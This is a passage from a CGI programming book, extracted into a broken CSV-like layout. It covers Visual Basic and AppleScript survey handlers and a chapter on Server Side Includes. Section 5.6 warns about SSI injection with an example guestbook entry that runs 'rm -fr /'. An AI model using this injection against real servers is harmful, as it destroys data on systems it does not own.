", is defined in the library.",NA,NA
 Dim intCtr As Integer,NA,NA
 Dim intFN As String,NA,NA
 Dim message As String,NA,NA
We define three variables that we will use later in the program: ,NA,NA
intCtr,NA,NA
", ",NA,NA
intFN,NA,NA
", and ",NA,NA
message,NA,NA
.,NA,NA
 intFN = FreeFile,NA,NA
" Open ""survey.dat"" for APPEND as #intFN",NA,NA
The variable ,NA,NA
intFN,NA,NA
" holds an unused file handle, thanks to the ",NA,NA
FreeFile,NA,NA
 function. We then proceed to use this ,NA,NA
"handle to open the file ""survey.dat"" in append mode; if the file does not exist, it is created.",NA,NA
" Print #intFN, ""Results from "" & CGI_RemoteHost ",NA,NA
"Print #intFN, ""-----< Start of Data >-----""",NA,NA
Information is output to the file by specifying the file handle with the Print statement. Visual Basic is a case-,NA,NA
insensitive language-unlike most of the languages we have discussed so far. The variable ,NA,NA
CGI_RemoteHost ,NA,NA
represents the environment variable REMOTE_HOST.,NA,NA
 For intCtr = 0 To CGI_NumFormTuples - 1,NA,NA
 Select Case CGI_FormTuples(intCtr).key,NA,NA
" Case ""name""",NA,NA
" message = ""Subject name: """,NA,NA
" Case ""regular""",NA,NA
" message = ""Regular exercise: """,NA,NA
" Case ""why""",NA,NA
" message = ""Reason for exercise: """,NA,NA
" Case ""sports""",NA,NA
" message = ""Primarily participates in: """,NA,NA
" Case ""interval""",NA,NA
" message = ""Exercise frequency: """,NA,NA
 End Select,NA,NA
" Print #intFN, message & CGI_FormTuples(intCtr).value ",NA,NA
Next  ,NA,NA
"Unlike Perl or Tcl, Visual Basic does not have support for arrays with string indexes. As a result, you cannot ",NA,NA
"have an ""array(key) = value"" construct. Instead, the form values are placed in a simple struct, such that the key ",NA,NA
and the value share the same numerical index.,NA,NA
"In this case, the integer variable ",NA,NA
CGI_NumFormTuples,NA,NA
 represents the number of key-value pairs. The loop ,NA,NA
iterates through each pair and outputs a message based on the value of the key. The key and value are stored in ,NA,NA
CGI_FormTuples(index).key,NA,NA
 and ,NA,NA
CGI_FormTuples(index),NA,NA
".value, respectively.",NA,NA
" Print #intFN, ""-----< End of Data >-----"" ",NA,NA
Close #intFN,NA,NA
"The end-of-data message is output to the file, and the file is closed.",NA,NA
" Send (""Content-type: text/html"")",NA,NA
" Send ("""")",NA,NA
" Send (""<TITLE>Thanks for filling out the survey!</TITLE>"")",NA,NA
" Send (""<H1>Thank You!</H1>"")",NA,NA
" Send (""<HR>"")",NA,NA
" Send (""Thanks for taking the time to fill out the form."")",NA,NA
 ,NA,NA
"Send (""We really appreciate it!"") ",NA,NA
End Sub,NA,NA
The ,NA,NA
Send,NA,NA
 function is used to output text to the server. It prints the message you specify to the file handle ,NA,NA
represented by the server.,NA,NA
AppleScript,NA,NA
"On the Macintosh, you can use either AppleScript or MacPerl to write CGI applications. Since we've looked at ",NA,NA
"enough Perl examples, let's write an example in AppleScript. There are two main reasons for using AppleScript ",NA,NA
"for CGI applications. First, it is quite easy to use, and the syntax looks like plain English. And second, many ",NA,NA
"libraries have been designed to aid in CGI application development. Now, here is an AppleScript program that ",NA,NA
accomplishes the same task as the Visual Basic example presented earlier.,NA,NA
"set survey_file to ""Macintosh HD:survey.dat""",NA,NA
The variable ,NA,NA
survey_file,NA,NA
 contains the path to the data file. This syntax is equal to:,NA,NA
"survey_file = ""Macintosh HD:survey.dat""",NA,NA
"The "":"" character is the directory separator on the Mac, just as UNIX uses a slash and Windows uses a backslash.",NA,NA
set crlf to (ASCII character 13) & (ASCII character 10) set ,NA,NA
"http_header to  ""HTTP/1.0 200 OK"" & crlf & -",NA,NA
" ""Server: WebSTAR/1.0 ID/ACGI"" & crlf & -",NA,NA
" ""MIME-Version: 1.0"" & crlf & -",NA,NA
" ""Content-type: text/html"" & -",NA,NA
 crlf & crlf,NA,NA
The HTTP header that we will send to the server is defined. Notice that this is a complete response. The ,NA,NA
WebSTAR server requires that all CGI applications send a complete response. You might also be wondering why,NA,NA
the regular newline character (\n) is not used to separate individual lines. The official HTTP specification ,NA,NA
"requires that servers send ""\r\n"", but most UNIX browsers accept ""\n"", while WebSTAR does not.",NA,NA
on `event WWWsdoc' path_args -,NA,NA
" given `class post':post_args, `class add':client_address",NA,NA
As explained in ,NA,NA
"Chapter 2, ",NA,NA
Input to the Common Gateway Interface,NA,NA
", this construct is used to check for an",NA,NA
"AppleEvent from WebSTAR, and to set the appropriate variables. Not all the information sent with the ",NA,NA
"AppleEvent is stored in variables, however, as this program does not require most of the information. The only ",NA,NA
"data that we need is the form data--passed as ""POST""--and the remote address of the client.",NA,NA
 set post_args_without_plus to dePlus post_args,NA,NA
 set decoded_post_args to Decode URL post_args_without_plus,NA,NA
"All the ""+"" signs in the form data are converted to spaces using the dePlus osax (Open Scripting Architecture ",NA,NA
"eXtension)--which is an external program written in a high-level language, such as C. Technically, you can also ",NA,NA
"accomplish the task in AppleScript, but using an osax is more efficient. Also, the form data is decoded using the ",NA,NA
"Decode URL osax, and stored in ",NA,NA
decoded_post_args,NA,NA
.,NA,NA
" set name       to findNamedArgument(decoded_post_args, ""name"") ",NA,NA
"set regular    to findNamedArgument(decoded_post_args, ""regular"")",NA,NA
" set why        to findNamedArgument(decoded_post_args, ""why"") set ",NA,NA
"sports     to findNamedArgument(decoded_post_args, ""sports"")",NA,NA
" set interval   to findNamedArgument(decoded_post_args, ""interval"")",NA,NA
The ,NA,NA
findNamedArgument,NA,NA
 function retrieves the form information for a specific field. All of the fields that ,NA,NA
comprise the form are separated and stored.,NA,NA
 try,NA,NA
 set survey_file_handle to open file alias survey_file,NA,NA
 position file survey_file at (get file length survey_file),NA,NA
 on error,NA,NA
" create file survey_file owner ""ttxt""",NA,NA
 set survey_file_handle to open file alias survey_file ,NA,NA
end try,NA,NA
"These statements set up an error handler. AppleScript will try to execute the commands in the first block, but if ",NA,NA
"an error occurs, the commands in the next block will be executed. Initially, the program tries to open the data file ",NA,NA
and store the file handle in ,NA,NA
survey_file_handle,NA,NA
". If it is successful, the ",NA,NA
position,NA,NA
 command places the pointer at the ,NA,NA
"end of the file. On the other hand, if there is an error, a new file is created and opened. The owner of the new file ",NA,NA
"is set to TeachText (""ttxt"")--a simple Macintosh file editor--so that it can be read by any text editor.",NA,NA
" set survey_output to ""Results from "" & client_address & crlf & -",NA,NA
" ""-----< Start of Data >-----"" & crlf & - ",NA,NA
"""Subject name: "" & name & crlf & -",NA,NA
" ""Regular exercise: "" & regular & crlf & -",NA,NA
" ""Reason for exercise: "" & why & crlf & - ",NA,NA
"""Primarily participates in: "" & -",NA,NA
 sports & crlf & -,NA,NA
" ""Exercise frequency: "" & interval & crlf & -",NA,NA
" ""-----< End of Data >-----"" & crlf",NA,NA
"The information that will be written to the data file is built, and stored in ",NA,NA
survey_output,NA,NA
.,NA,NA
 write file survey_file_handle text survey_output ,NA,NA
close file survey_file_handle,NA,NA
"The information is written to the file as text, and the file is closed.",NA,NA
 set thank_you to http_header & -,NA,NA
" ""<TITLE>Thanks for filling out the survey!</TITLE>"" & -",NA,NA
" ""<H1>Thank You!</H1>"" & ""<HR>"" & -",NA,NA
" ""Thanks for taking the time to fill out the form."" & -",NA,NA
" ""We really appreciate it!""",NA,NA
 return thank_you ,NA,NA
end `event WWWsdoc',NA,NA
"Finally, the return statement sends the thank-you message back to the client.",NA,NA
"on findNamedArgument(theText, theArg)",NA,NA
 try,NA,NA
 set oldDelims to AppleScript's text item delimiters,NA,NA
" set AppleScript's text item delimiters to ""&""",NA,NA
 set numItems to (count of text items in theText),NA,NA
 repeat with textCount from 1 to numItems,NA,NA
 set thisItem to text item textCount of theText,NA,NA
 try,NA,NA
" set AppleScript's text item delimiters to ""=""",NA,NA
 set argName to (first text item of thisItem),NA,NA
 if argName = theArg then,NA,NA
 set resItem to (second text item of thisItem),NA,NA
 exit repeat,NA,NA
 else,NA,NA
" set resItem to """"",NA,NA
 end if,NA,NA
" set AppleScript's text item delimiters to ""&"" ",NA,NA
on error,NA,NA
" set AppleScript's text item delimiters to ""&"" ",NA,NA
end try,NA,NA
 end repeat,NA,NA
 set AppleScript's text item delimiters to oldDelims,NA,NA
 on error,NA,NA
 set AppleScript's text item delimiters to oldDelims,NA,NA
" set resItem to """"",NA,NA
 end try,NA,NA
 return resItem ,NA,NA
end findNamedArgument,NA,NA
This function iterates through the form information and returns the value for a specified key. It was written by ,NA,NA
Maggie Burke (,NA,NA
mburke@umassd.edu,NA,NA
) from the Integrated Math Tools Project. Do not worry about how this ,NA,NA
works at this moment. Doesn't it look like English?,NA,NA
"In reality, splitting a key-value pair using this function is not the most efficient way to accomplish the task; every ",NA,NA
"time you call the function, it has to iterate through the information until it finds the specified key.",NA,NA
Designing Applications Using ,NA,NA
Forms in Perl,NA,NA
Server Side Includes,NA,NA
5. Server Side Includes,NA,NA
Contents: ,NA,NA
Introduction ,NA,NA
Configuration,NA,NA
Environment Variables,NA,NA
Including Boilerplates,NA,NA
File Statistics,NA,NA
Executing External Programs,NA,NA
Executing CGI Programs,NA,NA
Tailoring SSI Output,NA,NA
Common Errors,NA,NA
5.1 Introduction,NA,NA
"You're starting to get the hang of CGI, but aren't too thrilled with the fact that you have to write full-",NA,NA
fledged CGI programs even when you want to output a document with only a minimum amount of ,NA,NA
"dynamic information, right? For example, say you want to display the current date and time, or a ",NA,NA
certain CGI environment variable in your otherwise static document. You can go through the trouble ,NA,NA
"of writing a CGI program that outputs this small amount of virtual data, or better yet, you can use a ",NA,NA
powerful feature called Server Side Includes (or SSI).,NA,NA
Server Side Includes are directives which you can place into your HTML documents to execute other ,NA,NA
"programs or output such data as environment variables and file statistics. Unfortunately, not all ",NA,NA
"servers support these directives; the CERN server cannot handle SSI, but the servers from NCSA and ",NA,NA
"Netscape can. However, there is a CGI program called ",NA,NA
fakessi.pl,NA,NA
 that you can use to emulate Server ,NA,NA
Side Includes if your server does not support them.,NA,NA
"While Server Side Includes technically are not really CGI, they can become an important tool for ",NA,NA
"incorporating CGI-like information, as well as output from CGI programs, into documents on the ",NA,NA
Web.,NA,NA
How do Server Side Includes work? When the client requests a document from the SSI-enabled ,NA,NA
"server, the server parses the specified document and returns the evaluated document (see ",NA,NA
Figure 5.1,NA,NA
).,NA,NA
"The server does not automatically parse all files looking for SSI directives, but only ones that are ",NA,NA
configured as such. We will look at how to configure documents in the next section.,NA,NA
Figure 5.1: Server Side Includes,NA,NA
"SSI sounds like a great feature, but it does have its disadvantages. First, it can be quite costly for a ",NA,NA
"server to continually parse documents before sending them to the client. And second, enabling SSI ",NA,NA
creates a security risk. Novice users could possibly embed directives to execute system commands ,NA,NA
"that output confidential information. Despite these shortcomings, SSI can be a very powerful tool if ",NA,NA
used cautiously.,NA,NA
Table 5.1,NA,NA
" lists all the SSI directives. In this chapter, I'll discuss each of these directives in detail.",NA,NA
Table 5.1: SSI Directives,NA,NA
Command Parameter Description,NA,NA
echo,NA,NA
var,NA,NA
Inserts value of special SSI variables as well as other environment variables,NA,NA
include,NA,NA
file,NA,NA
Inserts text of document into current file,NA,NA
Pathname relative to current directory,NA,NA
fsize,NA,NA
virtual,NA,NA
Virtual path to a document on the server,NA,NA
file,NA,NA
Inserts the size of a specified file,NA,NA
flastmod,NA,NA
file,NA,NA
Inserts the last modification date and time for a specified file,NA,NA
exec,NA,NA
cmd,NA,NA
Executes external programs and inserts output in current document,NA,NA
Any application on the host,NA,NA
config,NA,NA
cgi,NA,NA
CGI program,NA,NA
Modifies various aspects of SSI,NA,NA
errmsg,NA,NA
Default error message,NA,NA
sizefmt,NA,NA
Format for size of the file,NA,NA
timefmt,NA,NA
Format for dates,NA,NA
Decoding Forms in Other,NA,NA
Languages,NA,NA
Configuration,NA,NA
5.2 Configuration,NA,NA
"How does the server know which files to parse, and which ones to return without parsing? From the ",NA,NA
"information in the server configuration files, of course. Let's look at how we can configure SSI on the ",NA,NA
NCSA server.,NA,NA
The first thing you need to set is the extension(s) for the files that the server should parse in the server ,NA,NA
configuration file (,NA,NA
srm.conf,NA,NA
"). For example, the following line will force the server to parse all files ",NA,NA
that end in .,NA,NA
shtml,NA,NA
:,NA,NA
 AddType text/x-server-parsed-html .shtml,NA,NA
"Internally, the server uses the ",NA,NA
text/x-server-parsed-html,NA,NA
 MIME content type to identify parsed ,NA,NA
documents. An important thing to note here is that you cannot have SSI directives within your CGI ,NA,NA
"program, because the server does not parse the output generated by the program.",NA,NA
"Alternatively, you can set the configuration so that the server parses all HTML documents:",NA,NA
AddType text/x-server-parsed-html .html,NA,NA
"However, this is not a good idea! It will severely degrade system performance because the server has ",NA,NA
to parse all the HTML documents that it returns.,NA,NA
Now let's look at the two configuration options that you must set in the access configuration file ,NA,NA
(,NA,NA
access.conf,NA,NA
) that dictate what type of SSI directives you can place in your HTML document:,"G 
  
 G",NA
If you want to embed SSI directives to display the environment variables and file statistics in ,NA,NA
"your HTML documents, you need to enable a feature called ",NA,NA
Includes,NA,NA
.,NA,NA
If you want to have the ability to execute external programs (CGI as well as other system ,NA,NA
"applications) from within your HTML documents, you need to enable the ",NA,NA
Exec,NA,NA
 feature.,NA,NA
Here is how you would enable both ,NA,NA
Includes,NA,NA
 and ,NA,NA
Exec,NA,NA
:,NA,NA
Options Includes ExecCGI,NA,NA
To exclusively enable ,NA,NA
Includes,NA,NA
 without ,NA,NA
Exec,NA,NA
", you need to add the following:",NA,NA
Options IncludesNoExec,NA,NA
"Before enabling either of these features, you should think about system security and performance.",NA,NA
Configuring SSI for the CERN Server,NA,NA
"As we mentioned at the beginning of this chapter, not all servers support SSI. However, you can use a ",NA,NA
Perl program called ,NA,NA
fakessi.pl,NA,NA
 to emulate SSI behavior. ,NA,NA
"For example, on the CERN server, all you need to do is: ",NA,NA
1.  Install ,NA,NA
fakessi.pl,NA,NA
 into the cgi-bin directory.,NA,NA
2. Add the following directive to ,NA,NA
httpd.conf:,NA,NA
Exec /*.shtml /usr/local/etc/httpd/cgi-bin/fakessi.pl ,NA,NA
(assuming that ,NA,NA
/usr/local/etc/httpd/cgi-bin,NA,NA
 is the directory that ,NA,NA
fakessi.pl,NA,NA
 was installed into). ,NA,NA
This tells the server to execute ,NA,NA
fakessi.pl,NA,NA
 whenever a client requests a file ending in ,NA,NA
.shtml,NA,NA
. ,NA,NA
You can get ,NA,NA
fakessi.pl,NA,NA
 from ,NA,NA
http://sw.cse.bris.ac.uk/WebTools/fakessi.html,NA,NA
.,NA,NA
Introduction,NA,NA
Environment Variables,NA,NA
5.3 Environment Variables,NA,NA
"As I mentioned before, you can insert the values of environment variables in an otherwise static HTML ",NA,NA
document. Here is an example of a document that contains a few SSI directives:,NA,NA
<HTML> ,NA,NA
<HEAD><TITLE>Welcome!</TITLE></HEAD> ,NA,NA
<BODY> ,NA,NA
"<H1>Welcome to my server at <!--#echo var=""SERVER_NAME""-->...</H1> ",NA,NA
<HR> ,NA,NA
"Dear user from <!--#echo var=""REMOTE_HOST""-->, ",NA,NA
<P> ,NA,NA
"There are many links to various CGI documents throughout the Web, ",NA,NA
so feel free to explore.,NA,NA
 .,NA,NA
 .,NA,NA
 .,NA,NA
<HR> ,NA,NA
"<ADDRESS>Shishir Gundavaram (<!--#echo var=""DATE_LOCAL""-->)</ADDRESS> ",NA,NA
</BODY></HTML>,NA,NA
SSI directives have the following format:,NA,NA
"<!--#command parameter=""argument""-->",NA,NA
"In this example, the ",NA,NA
echo,NA,NA
 SSI command with the ,NA,NA
var,NA,NA
 parameter is used to display the IP name or address of the ,NA,NA
"serving machine, the remote host name, and the local time. Of course, we could have written a CGI program to ",NA,NA
"perform the same function, but this approach is much quicker and easier, as you can see.",NA,NA
All environment variables that are available to CGI programs are also available to SSI directives. There are ,NA,NA
"also a few variables that are exclusively available for use in SSI directives, such as DATE_LOCAL, which ",NA,NA
contains the current local time. Another is DATE_GMT:,NA,NA
"The current GMT time is: <!--#echo var=""DATE_GMT""-->",NA,NA
which contains the Greenwich Mean Time.,NA,NA
Here is another example that uses some of these exclusive SSI environment variables to output information ,NA,NA
about the current document:,NA,NA
<H2>File Summary</H2> ,NA,NA
<HR> ,NA,NA
"The document you are viewing is titled:  <!--#echo var=""DOCUMENT_NAME""-->,",NA,NA
and you can access it a later time by opening the URL to: ,NA,NA
"<!--#echo var=""DOCUMENT_URI""-->. Please add this to your bookmark list.",NA,NA
<HR> ,NA,NA
"Document last modified on <!--#echo var=""LAST_MODIFIED""-->.",NA,NA
"This will display the name, URL (although the variable is titled DOCUMENT_URI), and modification time ",NA,NA
for the current HTML document.,NA,NA
"For a listing of CGI environment variables, see ",NA,NA
Table 2.1,NA,NA
. ,NA,NA
Table 5.2,NA,NA
 shows additional SSI environment ,NA,NA
variables.,NA,NA
Table 5.2: Additional SSI Environment Variables,NA,NA
Environment Variable ,NA,NA
Description,NA,NA
DOCUMENT_NAME ,NA,NA
The current file,NA,NA
DOCUMENT_URI ,NA,NA
Virtual path to the file,NA,NA
"QUERY_STRING_UNESCAPED Undecoded query string with all shell metacharacters escaped with ""\""",NA,NA
DATE_LOCAL ,NA,NA
Current date and time in the local time zone,NA,NA
DATE_GMT ,NA,NA
Current date and time in GMT,NA,NA
LAST_MODIFIED ,NA,NA
Last modification date and time for current file,NA,NA
Configuration,NA,NA
Including Boilerplates,NA,NA
5.4 Including Boilerplates,"There are times when you will have certain information that you repeat in numerous documents on the server, like 
 your signature, or a thank-you note. In cases like this, it's efficient to have that information stored in a file, and insert 
 that file into your various HTML documents with the SSI 
 include
  command. Suppose you have a signature file like 
 the following stored in 
 address.html
 :
  
 <HR> 
  
 <ADDRESS> 
  
 <PRE> 
  
 Shishir Gundavaram              WWW Software, Inc.
  
 White Street                    90 Sherman Street 
  
 Boston, Massachusetts 02115     Cambridge, Massachusetts 02140 
  
 shishir@bu.edu 
  
 The address information was last modified Friday, 22-Dec-95 12:43:00 EST.
  
 </PRE> 
  
 </ADDRESS>
  
 You can include the contents of this file in any other HTML document with the following command:
  
  <!--#include file=""address.html""-->
  
 This will include 
 address.html
  located in the current directory into another document. You can also use the 
 virtual 
 parameter with the 
 include
  command to insert a file from a directory relative to the server root:
  
 <!--#include virtual=""/public/address.html""-->
  
 For our final example, let's include a boilerplate file that contains embedded SSI directives. Here is the address file 
 (
 address.shtml
 ) with an embedded 
 echo
  command (note the 
 .shtml
  extension):
  
 <HR> 
  
 <ADDRESS> 
  
 <PRE> 
  
 Shishir Gundavaram              WWW Software, Inc.
  
 White Street                    90 Sherman Street 
  
 Boston, Massachusetts 02115     Cambridge, Massachusetts 02140 
  
 shishir@bu.edu 
  
 The address information was last modified on  <!--#echo var=""LAST_MODIFIED""-->.
  
 </PRE> 
  
 </ADDRESS>
  
 When you include this address file into an HTML document, it will contain your signature along with the date the file 
 was last modified.",NA
5.5 File Statistics,NA,NA
There are SSI directives that allow you to retrieve certain information about files located on your server.,NA,NA
"For example, say you have a hypertext link in one of your documents that points to a manual describing your ",NA,NA
"software that users can download. In such a case, you should include the size and modification date of that ",NA,NA
manual so users can decide whether it's worth their effort to download a document; it could be outdated or ,NA,NA
just too large for them to download. Here's an example:,NA,NA
Here is the latest reference guide on CGI. You can download it ,NA,NA
"by clicking <A HREF=""/cgi-refguide.ps"">here</A>. The size of the file is",NA,NA
"<!--#fsize file=""/cgi-refguide.ps""--> bytes and was last modified",NA,NA
"on <!--#flastmod file=""/cgi-refguide.ps""-->.",NA,NA
The ,NA,NA
fsize,NA,NA
" command, along with its lone parameter, file, displays the size of the specified file (relative to the ",NA,NA
document root) in bytes. You can use the ,NA,NA
flastmod,NA,NA
 command to insert the modification date for a certain file. ,NA,NA
The difference between the SSI variable LAST_MODIFIED and this command is that ,NA,NA
flastmod,NA,NA
 allows you ,NA,NA
"to choose any file, while LAST_MODIFIED displays the information for the current file. You have the ",NA,NA
option of tailoring the output from these commands with the ,NA,NA
config,NA,NA
 command. We will look at this later in ,NA,NA
the chapter.,NA,NA
Including Boilerplates,NA,NA
Executing External Programs,NA,NA
5.6 Executing External Programs,NA,NA
Wouldn't it be great if we could execute either a CGI or a system program and place its output in our HTML ,NA,NA
document? With the SSI command ,NA,NA
exec,NA,NA
", we can do just that using the ",NA,NA
exec cmd,NA,NA
 directive:,NA,NA
"Welcome <!--#echo var=""REMOTE_USER""-->. Here is some information about you: ",NA,NA
<PRE> ,NA,NA
"<!--#exec cmd=""/usr/ucb/finger $REMOTE_USER@$REMOTE_HOST""--> ",NA,NA
</PRE>,NA,NA
"In this example, we use the UNIX ",NA,NA
finger,NA,NA
 command to retrieve some information about the user. SSI allows us to ,NA,NA
pass command-line arguments to the external programs. If you plan to use environment variables as part of an ,NA,NA
"argument, you have to precede them with a dollar sign. The reason for this is that the server spawns a shell to ",NA,NA
"execute the command, and that's how you would access the environment variables if you were programming in a ",NA,NA
"shell. Here is what the output will look like, assuming REMOTE_USER and REMOTE_HOST are ""shishir"" and ",NA,NA
"""bu.edu"", respectively:",NA,NA
Welcome shishir. Here is some information about you: ,NA,NA
<PRE> ,NA,NA
[bu.edu] ,NA,NA
Trying 128.197.154.10...,NA,NA
Login name: shishir           In real life: Shishir Gundavaram ,NA,NA
Directory: /usr3/shishir      Shell: /usr/local/bin/tcsh Last ,NA,NA
login Thu Jun 23 08:18 on ttyq1 from nmrc.bu.edu:0.,NA,NA
New mail received Fri Dec 22 01:51:00 1995;,NA,NA
 unread since Thu Dec 21 17:38:02 1995 ,NA,NA
Plan: ,NA,NA
"Come on, aren't you done with the book yet?",NA,NA
</PRE>,NA,NA
"You should enclose the output from an external command in a <PRE>..</PRE> block, so that whitespace is ",NA,NA
"preserved. Also, if there is any HTML code within the data output by the external program, the browser will ",NA,NA
interpret it!,NA,NA
(To use the,NA,NA
 exec directive,NA,NA
", remember that you need to enable ",NA,NA
Exec,NA,NA
 in the ,NA,NA
Options,NA,NA
 line of the ,NA,NA
access.conf,NA,NA
" file, as ",NA,NA
"described in the ""Configuration"" seciton earlier in this chapter.)",NA,NA
"Having the ability to execute external programs makes things easier, but it also poses a major security risk. Say ",NA,NA
"you have a ""guestbook"" (a CGI application that allows visitors to leave messages for everyone to see) on a server ",NA,NA
that has SSI enabled. Most such guestbooks around the Net actually allow visitors to enter HTML code as part of ,NA,NA
"their comments. Now, what happens if a malicious visitor decides to do some damage by entering the following:",NA,NA
"<--#exec cmd=""/bin/rm -fr /""--> ",NA,NA
"If the guestbook CGI program was designed carefully, to strip SSI commands from the input, then there is no ",NA,NA
"problem. But, if it was not, there exists the potential for a major headache!",NA,NA
File Statistics,NA,NA
Executing CGI Programs,NA,NA
5.7 Executing CGI Programs,"You can use Server Side Includes to embed the results of an entire CGI program into a static HTML document, using the 
 exec 
 cgi
  directive.
  
 Why would you want to do this? There are many times when you want to display just one piece of dynamic data, such as:
  
 This page has been accessed 4883 times since December 10, 1995. 
  
 Surely, you've seen this type of information in many documents around the Web. Obviously, this information is being 
 generated dynamically (since it changes every time you access the document). We'll show you a few examples of embedded 
 CGI programs using SSI.",NA
User Access Counter,"Suppose you have a simple CGI program that keeps track of the number of visitors, called by the 
 exec
  SSI command in an 
 HTML document:
  
 This page has been accessed <!--#exec cgi=""/cgi-bin/counter.pl""--> times.
  
 The idea behind an access counter is simple. A data file on the server contains a count of the number of visitors that have 
 accessed a particular document. Whenever a user visits the document, the SSI command in that document calls a CGI program 
 that reads the numerical value stored in the file, increments it, and writes the new information back to the file and outputs it.
  
 Let's look at the program:
  
 #!/usr/local/bin/perl 
  
 print ""Content-type: text/plain"", ""\n\n""; 
  
 $count_file = ""/usr/local/bin/httpd_1.4.2/count.txt""; 
  
 if (open (FILE, ""<"" . $count_file)) {
  
  $no_accesses = <FILE>;
  
  close (FILE);
  
  if (open (FILE, "">"" . $count_file)) {
  
  
  
  $no_accesses++;
  
  
  
  print FILE $no_accesses;
  
  
  
  close (FILE);
  
  
  
  print $no_accesses;
  
  } else {
  
  
  
  print ""[ Can't write to the data file! Counter not incremented! ]"", ""\n""; 
 } 
  
 } else {
  
  print ""[ Sorry! Can't read from the counter data file ]"", ""\n""; 
  
 } 
  
 exit (0);
  
 Since we are opening the data file from this program, we need the full path to the file. We can then proceed to try to read from 
 the file. If the file cannot be opened, an error message is returned. Otherwise, we read one line from the file using the <FILE> 
 notation, and store it in the variable 
 $no_accesses
 . Then, the file is closed. This is very important because you cannot write to 
 the file that was opened for reading.
  
 Once that's done, the file is opened again, but this time in write mode, which creates a new file with no data. If that's not 
 successful, probably due to permission problems, an error message stating that information cannot be written to the file is",NA
Random Links,"You can use the following CGI program to create a ""random"" hypertext link. In other words, the link points to a different 
 WWW site every time you reload.
  
 Why do you want to do this? Well, for kicks. Also, if the sites are actually mirrors of each other, so it doesn't matter which one 
 you refer people to. By changing the link each time, you're helping to spread out the traffic generated from your site.
  
 Place the following line in your HTML document:
  
 <!--#exec cgi=""/cgi-bin/random.pl""-->
  
 Here's the program:
  
 #!/usr/local/bin/perl
  
 @URL = (""http://www.ora.com"",
  
  ""http://www.digital.com"",
  
  ""http://www.ibm.com"",
  
  ""http://www.radius.com"");
  
 srand (time | $$);
  
 The @URL array (or table) contains a list of the sites that the program will choose from. The 
 srand
  function sets a seed based 
 on the current time and the process identification for the random number generator. This ensures a truly random distribution.
  
 $number_of_URL = scalar (@URL);
  
 $random = int (rand ($number_of_URL));
  
 The 
 $number_of_URL
  contains the index (or position) of the last URL in the array. In Perl, arrays are zero-based, meaning that 
 the first element has an index of zero. We then use the 
 rand
  function to get a random number from 0 to the index number of the 
 last URL in the array. In this case, the variable 
 $random
  will contain a random integer from 0 to 3.
  
 $random_URL = $URL[$random];
  
 print ""Content-type: text/html"", ""\n\n"";
  
 print qq|<A HREF=""$random_URL"">Click here for a random Web site!</A>|, ""\n"";
  
 exit (0);
  
 A random URL is retrieved from the array and displayed as a hypertext link. Users can simply click on the link to travel to a",NA
Counting Days Until . . .,"Remember we talked about query strings as a way of passing information to a CGI program in Chapter 2? Unfortunately, you 
 cannot pass query information as part of an SSI 
 exec cgi
  directive. For example, you cannot do the following:
  
 <!--#exec cgi=""/cgi-bin/count_days.pl?4/1/96""-->
  
 The server will return an error.[1]
  
 [1] However, a CGI program called by the 
 exec
  SSI directive from a static HTML document has access to the 
 query string passed to this document. For example, if you access an HTML document in the following manner:
  
 http://some.machine/test.html?name=john
  
 and this document contains an SSI directive, then the CGI program can access the query string (""name=john"") by 
 reading the QUERY_STRING environment variable.
  
 However, we can create a regular Perl program (
 not
  a CGI program) that takes a date as an argument, and calculates the 
 number of days until/since that date:
  
 <!--#exec cmd=""/usr/local/bin/httpd_1.4.2/count_days.pl  4/1/96""-->
  
 In the Perl script, we can access this command-line data (i.e., ""4/1/96"") through the 
 @ARGV
  array. Now, the script:
  
 #!/usr/local/bin/perl 
  
 require ""timelocal.pl""; 
  
 require ""bigint.pl"";
  
 The 
 require
  command makes the functions within these two default Perl libraries available to our program.
  
 ($chosen_date = $ARGV[0]) =~ s/\s*//g;
  
 The variable 
 $chosen_date
  contains the date passed to this program, minus any whitespace that may have been inserted 
 accidentally.
  
 if ($chosen_date =~ m|^(\d+)/(\d+)/(\d+)$|) {
  
  ($month, $day, $year) = ($1, $2, $3);
  
 This is another example of a regular expression, or 
 regexp
 . We use the regexp to make sure that the date passed to the program 
 is in a valid format (i.e., 
 mm/dd/yyyy
 ). If it is valid, then 
 $month
 , 
 $day
 , and 
 $year
  will contain the separated month, day, and 
 year from the initial date.
  
  $month -= 1;
  
  if ($year > 1900) {
  
  $year -= 1900; 
  
  }
  
  $chosen_secs = &timelocal (undef, undef, undef, $day, $month, $year);
  
 We will use the 
 timelocal
  subroutine (notice the & in front) to convert the specified date to the number of seconds since 1970. 
 This subroutine expects month numbers to be in the range of 0--11 and years to be from 00--99. This conversion makes it easy 
 for us to subtract dates. An important thing to remember is that this program will not calculate dates correctly if you pass in a 
 date before 1970.
  
  $seconds_in_day = 60 * 60 * 24;   
  
  $difference = &bsub ($chosen_secs, time);
  
  $no_days = &bdiv ($difference, $seconds_in_day); 
 $no_days =~ s/^(\+|-)//;
  
 The 
 bsub
  subroutine subtracts the current time (in seconds since 1970) from the specified time. We used this subroutine",NA
5.8 Tailoring SSI Output,"The 
 config SSI
  command allows you to select the way error messages, file size information, and date and time are
  
 displayed. For example, if you use the 
 include
  command to insert a non-existing file, the server will output a default
  
 error message like the following:
  
 [an error occurred while processing this directive]
  
 By using the 
 config
  command, you can modify the default error message. If you want to set the message to ""Error,
  
 contact shishir@bu.edu"" you can use the following:
  
 <!--#config errmsg=""Error, contact shishir@bu.edu""-->
  
 You can also set the file size format that the server uses when displaying information with the 
 fsize
  command. For
  
 example, this command:
  
 <!--#config sizefmt=""abbrev""-->
  
 will force the server to display the file size rounded to the nearest kilobyte (K). You can use the argument ""bytes"" to set
  
 the display as a byte count:
  
 <!--#config sizefmt=""bytes""-->
  
 Here is how you can change the time format:
  
 <!--#config timefmt=""%D %r""-->
  
 The file address.html was last modified on: <!--#flastmod file=""address.html""--
 >.
  
 The output will look like this:
  
 The file address.html was last modified on: 12/23/95 07:17:39 PM
  
 The %D format specifies that the date should be in mm/dd/yy format, while the %r format specifies ""hh/mm/ss 
 AM|PM""
  
 format. 
 Table 5.3
  lists all the data and time formats you can use.
  
 Table 5.3: SSI Time Formats
  
 Format Value 
  
 Example
  
 %a 
  
 Day of the week abbreviation 
  
 Sun
  
 %A 
  
 Day of the week 
  
 Sunday
  
 %b 
  
 Month name abbreviation (see %h) Jan
  
 %B 
  
 Month name 
  
 January
  
 %d 
  
 Date 
  
 01 (
 not
  1)",NA
5.9 Common Errors,NA,NA
"There are two common errors that you can make when using Server Side Includes. First, you should ",NA,NA
"not forget the ""#"" sign:",NA,NA
"<!--echo var=""REMOTE_USER""-->",NA,NA
"Second, do not add extra spaces between the ""-"" sign and the ""#"" character:",NA,NA
